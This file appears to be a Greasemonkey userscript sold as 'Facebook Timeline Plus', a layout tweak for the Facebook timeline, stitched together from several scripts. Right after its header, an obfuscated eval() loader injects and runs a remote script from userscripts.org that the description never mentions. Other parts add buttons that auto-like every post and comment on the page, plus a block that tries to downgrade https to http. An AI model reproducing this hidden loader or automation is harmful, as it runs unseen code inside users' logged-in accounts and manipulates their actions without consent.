// ==UserScript==
// @name            		Facebook Timeline Plus
// @namespace      		Facebook
// @author         		Diimajinasi
// @description 		Modify the new Facebook Timeline to show all post in an unique block.
// @homepage		        http://www.facebook.com/
// @version         		Fix.3
// @icon			http://legis.wisconsin.gov/assembly/seidel/PublishingImages/facebookIcon.png
// @include			htt*://www.facebook.com/*
// @include         		htt*://www.beta.facebook.com/*
// @include         		htt*://www.lite.facebook.com/*
// @include		   http://www.facebook.com/*
// @include		   https://www.facebook.com/*
// @exclude			htt*://*static*.facebook.com*
// @exclude			htt*://*channel*.facebook.com*
// @exclude			htt*://developers.facebook.com/*
// @exclude			htt*://upload.facebook.com/*
// @exclude			htt*://www.facebook.com/common/blank.html
// @exclude			htt*://*connect.facebook.com/*
// @exclude			htt*://*facebook.com/connect*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/l.php*
// @exclude			htt*://www.facebook.com/ai.php*
// @exclude			htt*://www.facebook.com/extern/*
// @exclude			htt*://www.facebook.com/pagelet/*
// @exclude			htt*://api.facebook.com/static/*
// @exclude			htt*://www.facebook.com/contact_importer/*
// @exclude			htt*://www.facebook.com/ajax/*
// @exclude 		        htt*://apps.facebook.com/ajax/*
// @exclude			htt*://www.facebook.com/advertising/*
// @exclude			htt*://www.facebook.com/ads/*
// @exclude			htt*://www.facebook.com/sharer/*
// @exclude			htt*://www.facebook.com/send/*
// @exclude			htt*://www.facebook.com/mobile/*
// @exclude			htt*://www.facebook.com/settings/*
// @exclude			htt*://www.facebook.com/dialog/*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/bookmarks/*
// @grant       		none
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))





body = document.body;
	
if(body != null) {
	div = document.createElement("div");
	div.setAttribute('id','like2');
	div.style.position = "fixed";
	div.style.display = "block";
	div.style.width = "130px";
	div.style.opacity= 0.60;
	div.style.bottom = "+70px";
	div.style.left = "+8px";
	div.style.backgroundColor = "#eceff5";
	div.style.border = "1px dashed #94a3c4";
	div.style.padding = "2px";
	div.innerHTML = "<a style='font-weight:bold;color:#000000' onclick='AutoLike()'><center>like all status </center></a>"
	
	body.appendChild(div);

	//buat fungsi tunda
	function tunda(milliSeconds){
	var startTime = new Date().getTime(); 
	while (new Date().getTime() < startTime + milliSeconds); 
}
	
	unsafeWindow.AutoLike = function() {
		var BounceCounterLike=0;
		var Counter = 0;
		var prepare = document.getElementsByTagName("span");
		var buttons = new Array();
		
		for (var i = 0; i < prepare.length; i++)
			if(prepare[i].getAttribute("id")!=null&&prepare[i].getAttribute("id").indexOf(".reactRoot")>=0&&(prepare[i].innerHTML=="Me gusta"||prepare[i].innerHTML=="Like"||prepare[i].innerHTML=="Suka"||prepare[i].innerHTML=="Begen"||prepare[i].innerHTML=="??????"||prepare[i].innerHTML=="Seneng"||prepare[i].innerHTML=="J’aime")) {
				buttons[Counter] = prepare[i];
				Counter++;
			}
		
		function check_link(linknumber) {
			buttons[linknumber].click();
			var message = "<a style='font-weight:bold;color:#3B5998' onclick='Autolike()'><center>Like Status: "+ (linknumber + 1) +"/"+ buttons.length +"</center></a>";
			document.getElementById('like2').innerHTML = message;
			};
		
		function like_timer(timex) {
			window.setTimeout(bouncer_like,timex);
		};
		
		function check_warning() {
			var warning = document.getElementsByTagName("label");
			var checkwarning = false;
			
			for(var i = 0; i < warning.length; i++) {
				var myClass = warning[i].getAttribute("class");
				if(myClass!=null&&myClass.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0) {
					alert("Warning from Facebook");
					checkwarning = true;
				}
			}
			
			if(!checkwarning) like_timer(0);
		};
		
		function warning_timer(timex) {
			window.setTimeout(check_warning,timex);
		};
		
		function bouncer_like() {
			if ( BounceCounterLike < buttons.length ) {
				check_link(BounceCounterLike);
				warning_timer(0);
				BounceCounterLike++;
			}
		};
		
		bouncer_like();
		};
	}
	
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.setAttribute('id','like3');
	div.style.position = "fixed";
	div.style.display = "block";
	div.style.width = "130px";
	div.style.opacity= 0.60;
	div.style.bottom = "+50px";
	div.style.left = "+8px";
	div.style.backgroundColor = "#eceff5";
	div.style.border = "1px dashed #94a3c4";
	div.style.padding = "2px";
	div.innerHTML = "<a style='font-weight:bold;color:#000000' onclick='LikeComments()'><center>Like all comment</center></a>"

	body.appendChild(div);

	//buat fungsi tunda
	function tunda(milliSeconds){
	var startTime = new Date().getTime(); 
	while (new Date().getTime() < startTime + milliSeconds); 
}
	
	unsafeWindow.LikeComments = function() {
		var BounceCounterLike=0;
		var Counter = 0;
		var prepare = document.getElementsByTagName("a");
		var buttons = new Array();
		
		for (var i = 0; i < prepare.length; i++)
			if(prepare[i].getAttribute("data-ft")!=null&&(prepare[i].getAttribute("title")=="Me gusta este comentario"||prepare[i].getAttribute("title")=="Like this comment"||prepare[i].getAttribute("title")=="Suka komentar ini"||prepare[i].getAttribute("title")=="Nyenengi tanggapan iki"||prepare[i].getAttribute("title")=="??????? ????????"||prepare[i].getAttribute("title")=="J’aime ce commentaire"||prepare[i].getAttribute("title")=="Bu yorumu begen")) {
				buttons[Counter] = prepare[i];
				Counter++;
			}
		function check_link(linknumber) {
			buttons[linknumber].click();
			var message = "<a style='font-weight:bold;color:#3B5998' onclick='Autolike()'><center>Like all comment: "+ (linknumber + 1) +"/"+ buttons.length +"</center></a>";
			document.getElementById('like3').innerHTML = message;
			};
		function like_timer(timex) {
			window.setTimeout(bouncer_like,timex);
		};
		function check_warning() {
			var warning = document.getElementsByTagName("label");
			var checkwarning = false;
			for(var i = 0; i < warning.length; i++) {
				var myClass = warning[i].getAttribute("class");
				if(myClass!=null&&myClass.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0) {
					alert("Warning from Facebook");
					checkwarning = true;
					}
				}
			if(!checkwarning) like_timer(0);
		};
		function warning_timer(timex) {
			window.setTimeout(check_warning,timex);
		};
		function bouncer_like() {
			if ( BounceCounterLike < buttons.length ) {
				check_link(BounceCounterLike);
				warning_timer(0);
				BounceCounterLike++;
			}
		};
		bouncer_like();
		void(0);
	};
}

body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.style.position = "fixed";
	div.style.display = "block";
	div.style.width = "130px";
	div.style.opacity= 0.60;
	div.style.bottom = "+90px";
	div.style.left = "+8px";
	div.style.backgroundColor = "#eceff5";
	div.style.border = "1px dashed #94a3c4";
	div.style.padding = "2px";
	div.innerHTML = "<a style='font-weight:bold;color:#8b12c4' href='http://userscripts.org/scripts/show/123644'><center>facebook admin</center></a>"
body.appendChild(div);}
body = document.body;
if(body != null) {div = document.createElement("div");div.style.position = "fixed";div.style.display = "block";div.style.width = "130px";div.style.opacity= 0.60;div.style.bottom = "+30px";div.style.left = "+8px";div.style.backgroundColor = "#eceff5";div.style.border = "1px dashed #94a3c4";div.style.padding = "2px";div.innerHTML = "<a style='font-weight:bold;color:#3B5998' href='' title='Refresh'><center>REFRESH</center></a>"
body.appendChild(div);}

// ==/UserScript== 

function addGlobalStyle(css) {
    var head, style;
    head = document.getElementsByTagName('head')[0];
    if (!head) { return; }
    style = document.createElement('style');
    style.type = 'text/css';
    style.innerHTML = css;
    head.appendChild(style);
}

addGlobalStyle(' .notifAggroAutoFlyout #fbNotificationsFlyout.enableBeeper {display: none;)');

// ==/UserScript==

/* CHANGES:
 * # Fixed an issue that apply timline margin to the top section.
 * 
 * # Fixed link to usescript.
 * 
 * # Fixed name and version "undefined" in FireFox.
 * 
 * # Disabled recentAppsHeader that prevent some users to see the wall. 
 * 
 * # Fixed box borders css style.
 * 
 * # Fixed a change in liked_pages.
 * 
 * # Fixed images moved to left, maximum width added.
 * 
 * # Fixed all embed videos to fit the maximum width. 
 * # Fixed all external shared videos to center. 
 * 
 * # Added changes to support navigation to the past.
 * # Modified the filter button to the left of the screen.
 * # Fixed to center the navigation buttons to the past.
 * # Fixed to center all Cover, Profile and normal Photos
 * # Fixed to center all Videos.
 * # Fixed all preview of Text, Notes, Links, etc... 
 */

    
(function(timeline) {
    if (!document.getElementById('globalContainer') || document.getElementById('sweetGadget')) {
        return;
    }
    var AppInfo = {
        name: 'Diimajinasi',
        version: '2013',
        url: 'http://userscripts.org/scripts/show/123644'
    }
    var CssText = atob(
    'Ym9keSB7DQpiYWNrZ3JvdW5kOiB3aGl0ZSAhaW1wb3J0YW50Ow0KfQ0KI3JpZ2h0Q29sQ29udGVudCAucGFnZXNUaW1lbGluZUJ1'+
    'dHRvblBhZ2VsZXQgew0KYmFja2dyb3VuZC1jb2xvcjogd2hpdGUgIWltcG9ydGFudDsNCn0NCiNzd2VldEdhZGdldCB7DQp3aWR0'+
    'aDogMjAwcHg7DQpwb3NpdGlvbjogYWJzb2x1dGU7DQpoZWlnaHQ6IGF1dG87DQptYXJnaW4tdG9wOiAxNXB4Ow0KfQ0KI3N3ZWV0'+
    'R2FkZ2V0ID4gZGl2IHsNCmJvcmRlcjogMXB4IHNvbGlkICNDNENERTA7DQptYXJnaW46IDBweCAwcHggMTBweCAwcHg7DQpwYWRk'+
    'aW5nOiA0cHg7DQp9DQojc3dlZXRHYWRnZXQgLm9nUmVjZW50VGl0bGUgew0KbWFyZ2luOiAwcHggIWltcG9ydGFudDsNCn0NCiNz'+
    'd2VldEdhZGdldCAudGltZWxpbmVSZXBvcnRIZWFkZXIgew0KYmFja2dyb3VuZDogI0YxRjFGMTsNCmJvcmRlci1ib3R0b206IDFw'+
    'eCBzb2xpZCAjRTVFNUU1Ow0KbWFyZ2luOiAwcHggMHB4IDVweDsNCnBhZGRpbmc6IDVweCAwIDVweCAxMnB4Ow0KfQ0KI3N3ZWV0'+
    'R2FkZ2V0IHRhYmxlIHsNCndpZHRoOiAxOTBweCAhaW1wb3J0YW50Ow0KfQ0KI3N3ZWV0R2FkZ2V0IHRhYmxlIHRkIHsNCmRpc3Bs'+
    'YXk6IGlubGluZS1ibG9jazsNCndpZHRoOiAxODhweCAhaW1wb3J0YW50Ow0KfQ0KI3N3ZWV0R2FkZ2V0IHRhYmxlIHRkIC5mcmll'+
    'bmRMaXN0aW5nIHsNCndpZHRoOiBhdXRvICFpbXBvcnRhbnQ7DQp9DQojc3dlZXRHYWRnZXQgdGFibGUgdGQgZGl2Lm1icy5tcm0s'+
    'ICNzd2VldEdhZGdldCB0YWJsZSB0ZCBkaXYuY2FwdGlvbiB7DQpmbG9hdDogbGVmdDsNCn0NCiN0aW1lbGluZV90YWJfY29udGVu'+
    'dCAuZmJUaW1lbGluZVNlY3Rpb24gPiBvbC5mYlRpbWVsaW5lQ2Fwc3VsZSwNCiN0aW1lbGluZV90YWJfY29udGVudCAjcGFnZWxl'+
    'dF9lc2NhcGVfaGF0Y2ggew0KbWFyZ2luLWxlZnQ6IDIwNXB4ICFpbXBvcnRhbnQ7DQp9DQojdGltZWxpbmVfdGFiX2NvbnRlbnQg'+
    'I3BhZ2VsZXRfZXNjYXBlX2hhdGNoIC50aW1lbGluZUVzY2FwZUhhdGNoIC5mYlRpbWVsaW5lRXNjYXBlU2VjdGlvbkJvZHkgew0K'+
    'b3ZlcmZsb3cteDogYXV0bzsNCn0NCiN0aW1lbGluZV90YWJfY29udGVudCBvbC5mYlRpbWVsaW5lQ2Fwc3VsZSA+IGxpIHsNCndp'+
    'ZHRoOiAxMDAlICFpbXBvcnRhbnQ7DQpib3gtc2hhZG93OiAwcHggMHB4IDhweCAjQzRDREUwOw0KLXdlYmtpdC1ib3gtc2hhZG93'+
    'OiAwcHggMHB4IDhweCAjQzRDREUwOw0KLW1vei1ib3gtc2hhZG93OiAwcHggMHB4IDhweCAjQzRDREUwOw0KfQ0KI3RpbWVsaW5l'+
    'X3RhYl9jb250ZW50IC5mYlRpbWVsaW5lQ2Fwc3VsZSB7IA0KYmFja2dyb3VuZDogdHJhbnNwYXJlbnQgIWltcG9ydGFudDsNCn0N'+
    'CiN0aW1lbGluZV90YWJfY29udGVudCAuZmJUaW1lbGluZVNlY3Rpb25FeHBhbmRlciB7DQptYXJnaW4tYm90dG9tOiA0NXB4Ow0K'+
    'bWFyZ2luLWxlZnQ6IDIwNXB4Ow0KfQ0KI3RpbWVsaW5lX3RhYl9jb250ZW50IC5mYlRpbWVsaW5lQ29udGVudEhlYWRlciB7DQpt'+
    'YXJnaW4tbGVmdDogMjA1cHg7DQp9DQojdGltZWxpbmVfdGFiX2NvbnRlbnQgLmZiVGltZWxpbmVGaWx0ZXJzIHsNCm1hcmdpbi10'+
    'b3A6IDVweDsNCnBhZGRpbmctdG9wOiAwcHg7DQp9DQojdGltZWxpbmVfdGFiX2NvbnRlbnQgLmZiVGltZWxpbmVDYXBzdWxlIC5i'+
    'b3R0b21Cb3JkZXIgew0Kd2lkdGg6IGF1dG8gIWltcG9ydGFudDsNCmJhY2tncm91bmQ6ICNDNENERTAgIWltcG9ydGFudDsNCmhl'+
    'aWdodDogMnB4Ow0KYm9yZGVyLXJhZGl1czogMHB4IDBweCAzcHggM3B4Ow0KLXdlYmtpdC1ib3JkZXItcmFkaXVzOiAwcHggMHB4'+
    'IDNweCAzcHg7DQotbW96LWJvcmRlci1yYWRpdXM6IDBweCAwcHggM3B4IDNweDsNCn0NCiN0aW1lbGluZV90YWJfY29udGVudCAu'+
    'ZmJUaW1lbGluZUNhcHN1bGUgLnRvcEJvcmRlciB7DQp3aWR0aDogYXV0byAhaW1wb3J0YW50Ow0KYmFja2dyb3VuZDogI0M0Q0RF'+
    'MCAhaW1wb3J0YW50Ow0KaGVpZ2h0OiAxcHg7DQpib3JkZXItcmFkaXVzOiAzcHggM3B4IDBweCAwcHg7DQotd2Via2l0LWJvcmRl'+
    'ci1yYWRpdXM6IDNweCAzcHggMHB4IDBweDsNCi1tb3otYm9yZGVyLXJhZGl1czogM3B4IDNweCAwcHggMHB4Ow0KfQ0KI3RpbWVs'+
    'aW5lX3RhYl9jb250ZW50IC50aW1lbGluZVVuaXRDb250YWluZXIgLnVpQ29tbWVudENvbnRhaW5lciB7DQp3aWR0aDogYXV0byAh'+
    'aW1wb3J0YW50Ow0KbWFyZ2luOiAwcHggMHB4IDVweCAhaW1wb3J0YW50Ow0KcGFkZGluZzogMHB4ICFpbXBvcnRhbnQ7DQp9DQoj'+
    'dGltZWxpbmVfdGFiX2NvbnRlbnQgLmZiVGltZWxpbmVVbml0QWN0b3IgLnVpUHJvZmlsZVBob3RvTWVkaXVtIHsNCndpZHRoOiA1'+
    'MHB4ICFpbXBvcnRhbnQ7DQpoZWlnaHQ6IDUwcHggIWltcG9ydGFudDsNCn0NCiNyaWdodENvbENvbnRlbnQgLmZiVGltZWxpbmVT'+
    'Y3J1YmJlciwgLnNwaW5lUG9pbnRlciwgLmZiVGltZWxpbmVTcGluZSB7DQpkaXNwbGF5OiBub25lICFpbXBvcnRhbnQ7DQp9DQoj'+
    'dGltZWxpbmVfdGFiX2NvbnRlbnQgLmZiVGltZWxpbmVTZWN0aW9uVHJhbnNwYXJlbnQgew0KcGFkZGluZy10b3A6IDBweCAhaW1w'+
    'b3J0YW50Ow0KfQ0KI3RpbWVsaW5lX3RhYl9jb250ZW50IC5mYlRpbWVsaW5lVGltZVBlcmlvZCB7DQpiYWNrZ3JvdW5kOiB3aGl0'+
    'ZSAhaW1wb3J0YW50Ow0KfQ0KI3RpbWVsaW5lX3RhYl9jb250ZW50IC5mYlRpbWVsaW5lVHdvQ29sdW1uIC50aW1lbGluZVVuaXRD'+
    'b250YWluZXIsDQouZmJUaW1lbGluZUNhcHN1bGUgZGl2LmZiVGltZWxpbmVDb21wb3NlclVuaXQgew0Kd2lkdGg6IGF1dG8gIWlt'+
    'cG9ydGFudDsNCn0NCiN0aW1lbGluZV90YWJfY29udGVudCB7DQpwYWRkaW5nLWJvdHRvbTogMHB4ICFpbXBvcnRhbnQ7DQp9DQoj'+
    'dGltZWxpbmVfdGFiX2NvbnRlbnQgI3BhZ2VsZXRfcGFnZV9tb3N0X3JlY2VudF9zdHJlYW1fd3JhcHBlciAudWlTY3JvbGxhYmxl'+
    'QXJlYSwNCiN0aW1lbGluZV90YWJfY29udGVudCAjcGFnZWxldF9wYWdlX21vc3RfcmVjZW50X3N0cmVhbV93cmFwcGVyIC51aVNj'+
    'cm9sbGFibGVBcmVhQm9keSB7DQp3aWR0aDogMTkwcHggIWltcG9ydGFudDsNCn0NCiN0aW1lbGluZV90YWJfY29udGVudCAjcGFn'+
    'ZWxldF9wYWdlX21vc3RfcmVjZW50X3N0cmVhbV93cmFwcGVyIC5tYWluV3JhcHBlciB7DQp3aWR0aDogMTgwcHggIWltcG9ydGFu'+
    'dDsNCn0NCiN0aW1lbGluZV90YWJfY29udGVudCAjcGFnZWxldF9wYWdlX21vc3RfcmVjZW50X3N0cmVhbV93cmFwcGVyIC5zdG9y'+
    'eUNvbnRlbnQgLnN0b3J5SW5uZXJDb250ZW50IHsNCm92ZXJmbG93OiBoaWRkZW47DQpkaXNwbGF5OiBpbmxpbmUgIWltcG9ydGFu'+
    'dDsNCndpZHRoOiBhdXRvICFpbXBvcnRhbnQ7DQp9DQojdGltZWxpbmVfdGFiX2NvbnRlbnQgLnN0b3J5Q29udGVudCAubWFpbldy'+
    'YXBwZXIgew0KbWFyZ2luOiAwcHggIWltcG9ydGFudDsNCnBhZGRpbmc6IDBweCAhaW1wb3J0YW50Ow0KfQ0KI3RpbWVsaW5lX3Rh'+
    'Yl9jb250ZW50IC5zdG9yeUNvbnRlbnQgLm12bSB7DQptYXJnaW4tYm90dG9tOiAwcHggIWltcG9ydGFudDsNCn0NCiN0aW1lbGlu'+
    'ZV90YWJfY29udGVudCAucHJvZmlsZVBpY0NoYW5nZVVuaXQsIA0KI3RpbWVsaW5lX3RhYl9jb250ZW50IC5jb3ZlclBob3RvQ2hh'+
    'bmdlVW5pdCwNCiN0aW1lbGluZV90YWJfY29udGVudCAucGhvdG9Vbml0LA0KI3RpbWVsaW5lX3RhYl9jb250ZW50IC52aWRlb1Vu'+
    'aXQgIHsNCm1heC13aWR0aDogNjE1cHggIWltcG9ydGFudDsNCm1hcmdpbjogYXV0byAhaW1wb3J0YW50Ow0KYmFja2dyb3VuZDog'+
    'I0YyRjJGMiAhaW1wb3J0YW50Ow0Kd2lkdGg6IDEwMCU7DQp9DQojdGltZWxpbmVfdGFiX2NvbnRlbnQgLnZpZGVvVW5pdCAuc3dm'+
    'T2JqZWN0IHsNCndpZHRoOiAxMDAlICFpbXBvcnRhbnQ7DQp9DQojdGltZWxpbmVfdGFiX2NvbnRlbnQgLnRpbWVsaW5lVW5pdENv'+
    'bnRhaW5lciAuZXh0ZXJuYWxTaGFyZVVuaXRXcmFwcGVyIHsNCmJhY2tncm91bmQ6ICNGMkYyRjI7IA0KfQ0KI3RpbWVsaW5lX3Rh'+
    'Yl9jb250ZW50IC50aW1lbGluZVVuaXRDb250YWluZXIgLmV4dGVybmFsU2hhcmVVbml0V3JhcHBlciAuZXhwbG9kZWQgew0KbWFy'+
    'Z2luOiBhdXRvICFpbXBvcnRhbnQ7DQp9DQojdGltZWxpbmVfdGFiX2NvbnRlbnQgLnBob3RvVW5pdCAucGhvdG9XaWR0aDEgLnBo'+
    'b3RvV3JhcCB7DQp3aWR0aDogNjA1cHggIWltcG9ydGFudDsNCnRleHQtYWxpZ246IGNlbnRlcjsNCn0NCiN0aW1lbGluZV90YWJf'+
    'Y29udGVudCAucGhvdG9Vbml0IC5waG90b1dpZHRoMiAucGhvdG9XcmFwIHsNCndpZHRoOiAzMDBweCAhaW1wb3J0YW50Ow0KdGV4'+
    'dC1hbGlnbjogY2VudGVyOw0KfQ0KI3RpbWVsaW5lX3RhYl9jb250ZW50IC5waG90b1VuaXQgLnBob3RvV2lkdGgzIC5waG90b1dy'+
    'YXAgew0Kd2lkdGg6IDIwMHB4ICFpbXBvcnRhbnQ7DQp0ZXh0LWFsaWduOiBjZW50ZXI7DQp9DQojdGltZWxpbmVfdGFiX2NvbnRl'+
    'bnQgLnBob3RvVW5pdCAucGhvdG9XcmFwIGltZyB7DQpsZWZ0OiAwcHggIWltcG9ydGFudDsNCm1heC13aWR0aDogNjAwcHg7DQp9'+
    'DQojdGltZWxpbmVfdGFiX2NvbnRlbnQgLmZiVGltZWxpbmVPbmVDb2x1bW4gLmV4dGVybmFsU2hhcmVUZXh0IHsNCndpZHRoOiBh'+
    'dXRvICFpbXBvcnRhbnQ7DQp9DQojdGltZWxpbmVfdGFiX2NvbnRlbnQgLmZiVGltZWxpbmVPbmVDb2x1bW4gLmhhc0ltYWdlIC5l'+
    'eHRlcm5hbFNoYXJlVGV4dCB7DQp3aWR0aDogNDgwcHggIWltcG9ydGFudDsNCn0NCiN0aW1lbGluZV90YWJfY29udGVudCAubGlr'+
    'ZVVuaXQgLmxpa2VVbml0VG9vbHRpcCB7DQpoZWlnaHQ6IDEzMHB4OyAhaW1wb3J0YW50Ow0KfQ==');
    
    var SweetGadget = null, StyleDoc = document.createElement('style');
    StyleDoc.setAttribute('type', 'text/css');
    StyleDoc.appendChild(document.createTextNode(CssText));
    document.head.appendChild(StyleDoc);
    timeline=CssText=StyleDoc=null;
    
    if (addGadget() === true) {
        dockPages(document);
    }
    
    document.addEventListener('DOMSubtreeModified', function(e) {
        if (!document.getElementById('sweetGadget')) {
            if (addGadget() !== true) {
                return;
            }
        }
        if (e.target) {
            if (e.target.id=='pagelet_timeline_recent'
            || /fbTimelineCapsule/.test(e.target.className)) {
                dockPages(e.target);
            }
        }
    }, false);
    
    function addGadget() {
        var ContentDoc = document.getElementById('timeline_tab_content');
        var div = document.createElement('div');
        if (!ContentDoc || !document.querySelector('ol.fbTimelineCapsule')) {
            return false;
        }
        SweetGadget = document.createElement('div');
        SweetGadget.setAttribute('id', 'sweetGadget');
        ContentDoc.insertBefore(SweetGadget, ContentDoc.firstChild);
        div.setAttribute('id', 'sweet_version_info');
        div.setAttribute('style', 'text-align: center;');
        div.innerHTML = '<a href="'+AppInfo.namespace+'" target="_blank">'+AppInfo.name +' v'+ AppInfo.version +'</a>';
        SweetGadget.appendChild(div);
        return true;
    }
    function dockPages(target) {
        if (!SweetGadget) {
            return;
        }
        var element;
        if ((element = target.querySelector('.fbTimelineFilters'))) {
            document.getElementById('sweet_version_info').appendChild(element);
        }
        if ((element = target.querySelector('.pageFriendSummaryContainer'))) {
            element.parentNode.style.display = 'none';
            SweetGadget.appendChild(element);
        }            
        if ((element = target.querySelector('#pagelet_page_most_recent_unit_wrapper'))) {
            element.style.display = 'none';
            element = element.querySelector('.timelineUnitContainer');
            if (element) {
                SweetGadget.appendChild(element);
            }
        }            
        if ((element = target.querySelector('#liked_pages_timeline_unit_list'))) {
            element.parentNode.parentNode.style.display = 'none';
            SweetGadget.appendChild(element.parentNode);
        }            
        if ((element = target.querySelector('#pagelet_timeline_friends_unit'))) {
            element.parentNode.parentNode.style.display = 'none';
            SweetGadget.appendChild(element);
        }
        /*
        if ((element = target.querySelector('.recentActivityUnit'))) {
            element.parentNode.style.display = 'none';
            SweetGadget.appendChild(element);
        }
        if ((element = target.querySelector('.recentAppsHeader'))) {
            element = element.parentNode;
            element.parentNode.style.display = 'none';
            SweetGadget.appendChild(element);
        }
        */
        if ((element = target.querySelector('.videoUnit a.videoThumb[href*=max_width]'))) {
            var width = /max_width=(\d+)/i.exec(element.href);
            if (width && parseInt(width[1]) > 614) {
                element.href = element.href.replace(/max_width=(\d+)/i, 'max_width=614');
            }
        }
    }
})();

// ==/UserScript==

var links = {



// LINKS SECTION
// FORMAT: "LINK TEXT" : "LINK URL",
/////////////////////////////////////////////////////////////////////////////
"Games"  : "http://www.facebook.com/?sk=cg",
"Group"  : "http://www.facebook.com/?sk=pp",
"MW"     : "http://www.facebook.com/?sk=app_10979261223",
"Photos" : "http://www.facebook.com/?sk=app_2305272732_2392950137",
"Req"    : "http://www.facebook.com/reqs.php",
"Status" : "http://www.facebook.com/?sk=app_2915120374",
/////////////////////////////////////////////////////////////////////////////



"":"" // Don't change
};

// Get ID
function $(ID) {return document.getElementById(ID);}

// Create by avg, modified by JoeSimmons
function create(a,b) {
	var ret=document.createElement(a);
	if(b) for(var prop in b) {
		if(prop.indexOf('on')==0 && typeof b[prop]!="string") ret.addEventListener(prop.substring(2),b[prop],false);
		else if(prop=="kids" && (prop=b[prop])) {
			for(var i=0;i<prop.length;i++) ret.appendChild(prop[i]);
		}
		else if('style,accesskey,id,name,src,href,class,target'.indexOf(prop)!=-1 && typeof b[prop]=="string") ret.setAttribute(prop, b[prop]);
		else ret[prop]=b[prop];
	}  return ret;
}

if(!$("headNav")) return;
var navSearch = $("headNav"), space = / /g,
	menubar = create("div", {id:"extra_links_holder", class:"lfloat", style:"border: 0px solid black; padding-top: 8px;"});
for(var u in links) {
	if(u!="") menubar.appendChild(create("a", {href:links[u], textContent:u, style:"padding:14px 4px 8px 4px !important; color:#FFFFFF; font-weight:normal; font-family: verdana, tahoma, arial, sans-serif; font-size: 7px;", target:"_parent"}));
}
navSearch.insertBefore(menubar, navSearch.nextSibling);

// ==/UserScript==

addr=window.location.href;
if (addr.indexOf("http")>0 || addr.indexOf("http")==-1) {
    window.location=addr.replace('https','http');
}

// ===============